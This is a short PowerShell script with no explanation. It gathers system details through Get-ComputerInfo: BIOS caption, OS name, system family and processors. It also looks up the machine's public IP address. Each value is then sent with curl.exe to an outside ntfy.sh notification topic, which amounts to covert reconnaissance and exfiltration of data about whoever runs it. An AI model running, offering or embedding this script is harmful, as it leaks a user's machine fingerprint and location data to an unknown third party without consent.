$n = Get-ComputerInfo
curl.exe http://ntfy.sh/unzrem -d $n.bioscaption
curl.exe http://ntfy.sh/unzrem -d $n.osname
curl.exe http://ntfy.sh/unzrem -d $n.cssystemfamily
curl.exe http://ntfy.sh/unzrem -d $n.csprocessors
$ipin = curl.exe ipinfo.io/ip
curl.exe http://ntfy.sh/unzrem -d $ipin
exit
exit
